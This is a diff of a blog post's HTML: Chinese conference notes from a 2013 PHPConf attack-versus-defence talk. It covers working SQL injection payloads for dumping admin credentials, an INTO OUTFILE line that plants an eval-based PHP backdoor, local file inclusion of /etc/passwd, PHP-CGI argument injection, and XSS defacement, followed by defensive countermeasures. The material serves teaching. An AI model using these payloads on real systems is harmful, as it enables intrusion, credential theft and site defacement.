@@ -2,313 +2,229 @@
 <html lang="en-us">
 <title>2013 PHPConf | Jack&#39;s Note</title>
 <meta charset="utf-8">
-<meta name="generator" content="Hugo 0.58.3" />
+<meta name="generator" content="Hugo 0.104.2" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="/css/index.css">
 <link rel="canonical" href="/posts/phpconf-hack/">
 <link rel="alternate" type="application/rss+xml" href="" title="Jack&#39;s Note">
-<link rel="stylesheet" href="/css/theme.css">
-<link rel="stylesheet" href="/css/classes.css">
 
-<header class="dark">
-  <h2><a href="/">Jack&#39;s Note</a></h2>
-  <nav>
-    
-  </nav>
+<header>
+  
+    <a href="/" class="title">Jack&#39;s Note</a>
+  
+  
 </header>
 
 <article>
   <header>
-    <h1><a href="/posts/phpconf-hack/">2013 PHPConf</a></h1>
-    <p class="meta"><time datetime="2013-11-01T23:03:00Z">November 01, 2013</time></p>
+    <h1>2013 PHPConf</h1>
+    <time datetime="2013-11-01T23:03:00Z">November 01, 2013</time>
   </header>
-  
-
-<p>&ldquo;矛盾大對決&rdquo;是 PHPConf 的第一場 , 很不錯的開場, 而且也補足我一些防駭的觀念</p>
-
+  <p>&ldquo;矛盾大對決&quot;是 PHPConf 的第一場 , 很不錯的開場, 而且也補足我一些防駭的觀念</p>
 <p>一邊防守, 一邊攻擊及解說, 實在太讚了!</p>
-
 <h2 id="sql-injection">SQl Injection</h2>
-
 <p><code>show.php?id=1</code> + <code>'</code></p>
-
 <p>= <code>show.php?id=1'</code></p>
-
 <blockquote>
 <ul>
 <li>如果有錯誤代表沒有做過濾</li>
 <li>補充 : sql injection 也可以直接在密碼地方輸入 <code>' or &quot;1&quot;=&quot;1&quot; --</code> 來測試它是否有漏洞</li>
 </ul>
 </blockquote>
-
 <h3 id="寫後門改首頁">寫後門改首頁</h3>
-
 <p><code>show.php?id=20 into outfile '/var/www/.a.php' lines terminated by '&lt;?php eval($_POSST[cmd];?&gt;'</code></p>
-
 <blockquote>
 <p>在 <code>/var/www</code> 建立一個 PHP 的後門
 前提是 apache 要有對資料夾執行寫檔的權限</p>
 </blockquote>
-
 <p>改首頁囉 !</p>
-
-<p>對 <a href="http://XXXX.XXX/.a.php">http://XXXX.XXX/.a.php</a> POST, cmd的值為 :</p>
-
+<p>對 http://XXXX.XXX/.a.php POST, cmd的值為 :</p>
 <p>檢視資料清單</p>
-
 <pre><code>echo `ls -alh`
 </code></pre>
-
 <blockquote>
 <p><code>`</code> 包起來代表 php 會去執行 linux command</p>
 </blockquote>
-
 <p>改首頁</p>
-
 <pre><code>echo `echo Hack by Orange &gt; index.php`
 </code></pre>
-
 <h2 id="使用-union-污染-sql-結果">使用 union 污染 sql 結果</h2>
-
 <blockquote>
 <p>這邊不太懂</p>
 </blockquote>
-
 <p>show.php?id=1</p>
-
 <pre><code>SELECT * FROM news WHERE id=1
 </code></pre>
-
 <p>show.php?id=1 union select 1,2,3</p>
-
 <pre><code>SELECT * FROM news WHERE id=1 union select 1,2,3
 </code></pre>
-
 <p>show.php?id=-1 union select 1,2,3</p>
-
 <pre><code>SELECT * FROM news WHERE id=-1 union select 1,2,3
 </code></pre>
-
 <blockquote>
 <p>最後會將 1  2   3 顯示在網頁上不同的區塊, 藉此知道它的欄位會顯示在哪</p>
 </blockquote>
-
 <p>洩露敏感資訊</p>
-
 <pre><code>show.php?id=-1 union select 1,user(),database()
 </code></pre>
-
 <p>取得管理員帳號密碼</p>
-
 <pre><code>show.php?id=-1 union select 1, username, password from admin where username like '%admin%'
 </code></pre>
-
 <blockquote>
 <p>再拿被加密過的密碼拿去反解</p>
 </blockquote>
-
 <h2 id="繞過空白字元檢查過濾">繞過空白字元檢查過濾</h2>
-
 <p>mysql 解釋語法寬鬆特性</p>
-
 <p>show.php?id=-1 union select 1,2,3</p>
-
 <p><code>show.php?id=-1/**/union/**/select/**/1,2,3</code>  (OK)</p>
-
 <p><code>show.php?id=-1%09union%0Dselect%A01,2,3</code> (試不出來)</p>
-
 <blockquote>
 <p>hex 值 :
 <code>%09</code> : 水平定位符號, 也就是 TAB 鍵
 <code>%0D</code> :
 <code>%A0</code> : 不知道是不是寫錯了, <code>%0A</code> ENTER 鍵, 比較像(不確定)</p>
 </blockquote>
-
 <p><code>show.php?id=(-1)union(select(1),2,3)</code> (OK)</p>
-
 <h2 id="繞過單引號過濾檢查">繞過單引號過濾檢查</h2>
-
 <p>select &lsquo;foo&rsquo; =  select 0x666f6f</p>
-
 <p>show.php?id=-1 union select username, password, 3 from admin where userlike 0x2561646d25</p>
-
 <blockquote>
 <p><code>25</code>= <code>%</code>
 <code>61</code> = <code>a</code>
 <code>64</code> = <code>d</code>
 <code>6d</code> = <code>m</code></p>
 </blockquote>
-
-<h2 id="如果-into-outfile-var-www-a-php-被鎖-不能寫檔">如果 into outfile &lsquo;/var/www/.a.php&rsquo; 被鎖, 不能寫檔</h2>
-
+<h2 id="如果-into-outfile-varwwwaphp-被鎖-不能寫檔">如果 into outfile &lsquo;/var/www/.a.php&rsquo; 被鎖, 不能寫檔</h2>
 <p>XSS 並不是偷 cookie 而已, 也可以劫持首頁</p>
-
 <pre><code>&lt;script&gt;window.onload = function (){document.write(/Hacked by Orange/)}&lt;/script&gt;
 </code></pre>
-
 <h2 id="php-雙引號執行">PHP 雙引號執行</h2>
-
 <blockquote>
 <p>簡單來說就是包在雙引號裡會執行變數的值</p>
 </blockquote>
-
 <ul>
 <li>$db_user = &ldquo;root&rdquo;;</li>
 <li>$db_user = &ldquo;root $foo&rdquo;;</li>
 <li>$db_user = &ldquo;root ${@phpinfo()}&rdquo;;</li>
-<li>$db_user = &ldquo;root ${@eval($_POST[cmd])}&ldquo;;</li>
+<li>$db_user = &ldquo;root ${@eval($_POST[cmd])}&rdquo;;</li>
 </ul>
-
 <h2 id="local-file-inclusion">Local file inclusion</h2>
-
 <p>假如有一段 code</p>
-
 <pre><code>$_mod = $_GET[module];
 include('modules/'. $_mod .'.php');
 </code></pre>
-
 <p>可以 load GET 值的頁面</p>
-
 <ul>
 <li>index.php?module=login</li>
 <li>index.php?module=logout</li>
 <li>index.php?module=add</li>
 </ul>
-
 <p>沒過濾好的話可以用來幹壞事 :</p>
-
 <ul>
 <li>index.php?module=./login</li>
 <li>index.php?module=./login.php%00</li>
 <li>index.php?module=../../../etc/passwd%00</li>
 </ul>
-
 <p>如果又開放讓駭客上傳檔案</p>
-
 <ul>
 <li>上傳圖片</li>
 <li><code>/var/log/httpd/access.log</code></li>
 <li>upload + $_FILES[file][tmp_name]</li>
 <li><code>/proc/self/environ</code></li>
 </ul>
-
 <p><code>index.php?module=../../../proc/self/environ</code> :</p>
-
-<p>User-Agent : &lt;?php file_put_contents(&lsquo;.a.php&rsquo;, $_POST[c]); ?&gt;</p>
-
+<p>User-Agent : <!-- raw HTML omitted --></p>
 <blockquote>
 <ul>
 <li><code>HTTP_USER_AGENT=Mozilla/5.0 (Macinosh; Intel Mac OS X 10.8; rv:24.0)</code></li>
 <li><code>Gecko/20100101 Firefox/24.0</code></li>
 </ul>
 </blockquote>
-
-<p>可以利用 Firefox 工具 User-Agent, 改成 &lt;?php@phpinfo();?&gt;</p>
-
+<p>可以利用 Firefox 工具 User-Agent, 改成 <!-- raw HTML omitted --></p>
 <blockquote>
 <p>頁面就會執行 phpinfo 的結果了</p>
 </blockquote>
-
 <h2 id="php-cgi-argument-injection">PHP-CGI Argument Injection</h2>
-
 <p><code>index.php?-s</code></p>
-
 <blockquote>
 <p>php-cgi -s index.php</p>
 </blockquote>
-
 <p>會噴出 index.php 的 code</p>
-
 <p>index.php?-d+allow_url_include%3dOn+-d+auto_prepend_file%3dphp://input</p>
-
 <blockquote>
 <ul>
 <li><code>php-cgi -d allow_url_include=On</code></li>
 <li><code>php-cgi -d auto_prepend_file=php://input</code></li>
 </ul>
 </blockquote>
-
 <p>POST :</p>
-
 <p><code>&lt;?php echo `id:uname -a`; phpinfo(); ?&gt;</code>
 <code>&lt;?php `echo CCCC &gt; index.php`;?&gt;</code></p>
-
 <h2 id="防禦方">防禦方</h2>
-
 <p>基本防禦 :</p>
-
 <ul>
 <li>網站、DB 要分開</li>
 <li>資料庫使用者權必須降低</li>
 <li>使用者若非需要 FILE 權限記得拿掉</li>
 </ul>
-
 <p>防堵 SQL Injection</p>
-
 <ul>
 <li>使用 Prepared Statements</li>
 <li>過濾輸入的值, 判斷變數型態或轉強制轉型態 <code>intval()</code></li>
 <li>過濾字串函數過濾非法的字元, ex : <code>mysql_real_escape_string()</code> 、 <code>addslashes()</code></li>
 </ul>
-
 <blockquote>
 <p>注意 double-bytes encoding 問題, 需使用 UTF-8</p>
 </blockquote>
-
 <ul>
 <li>使用 Stored Procedures</li>
 <li>控管錯誤訊息只有管理者可以閱讀</li>
 <li>控管資料庫及網站使用者帳號權限為何</li>
 </ul>
-
 <p>XSS 防禦</p>
-
 <ul>
 <li>不要相信任何 input</li>
 <li>PHP 使用 <code>htmlentities()</code> 過濾輸出到 view 的字串</li>
 <li>資料庫的輸入也要過濾</li>
 <li>使用白名單機制過濾, 而不單只是黑名單</li>
-<li>OWASP Cross Site Scripting Prevention Cheat Sheet
-&gt; <a href="http://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet">http://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet</a></li>
+<li>OWASP Cross Site Scripting Prevention Cheat Sheet</li>
 </ul>
-
+<blockquote>
+<p><a href="http://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet">http://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet</a></p>
+</blockquote>
 <p>Double Quote Evaluation</p>
-
 <ul>
-<li><p>不同輸出決定不同限擋方式
-&gt; * 網頁 : htmlentities()
-&gt; * 資料庫 : 防止 SQL Injection</p></li>
-
-<li><p>直接去除 <code>'</code> <code>&quot;</code> <code>;</code> 等含有 php 語法之特殊符號</p></li>
-
-<li><p>使用 Single Quote 而非 Double Quote</p></li>
+<li>不同輸出決定不同限擋方式</li>
 </ul>
-
+<blockquote>
+<ul>
+<li>網頁 : htmlentities()</li>
+<li>資料庫 : 防止 SQL Injection</li>
+</ul>
+</blockquote>
+<ul>
+<li>直接去除 <code>'</code> <code>&quot;</code> <code>;</code> 等含有 php 語法之特殊符號</li>
+<li>使用 Single Quote 而非 Double Quote</li>
+</ul>
 <p>Local File Inclusion</p>
-
 <ul>
 <li>使用 index/hash 等方法, 而非直接讀取檔案</li>
 <li>避免將私密物件直接暴露給使用者</li>
 <li>驗證所有物件是否為正確物件</li>
 </ul>
-
 <p>PHP-CGI Argument Injection</p>
-
 <ul>
 <li>只能更新了</li>
 <li>WAF / .htaccess 等方法把所有 <code>-</code> 過濾掉</li>
 </ul>
-
 <blockquote>
 <ul>
 <li><code>RewriteCond %{QUERY_STRING} ^(%2dl\-)[^=]+$ [NC]</code></li>
 <li><code>RewriteRule (.*) - [F,L]</code></li>
 </ul>
 </blockquote>
-
 <p>結論 : 駭客攻擊手法多, 必須了解攻擊手法才能針對及進行防禦</p>
-
 <p>ref :</p>
-
 <p><a href="https://speakerdeck.com/p8361/phpconf-2013-mao-dun-da-dui-jue">https://speakerdeck.com/p8361/phpconf-2013-mao-dun-da-dui-jue</a>
 <a href="https://speakerdeck.com/allenown/phpconf-2013-mao-dun-da-dui-jue">https://speakerdeck.com/allenown/phpconf-2013-mao-dun-da-dui-jue</a></p>
 
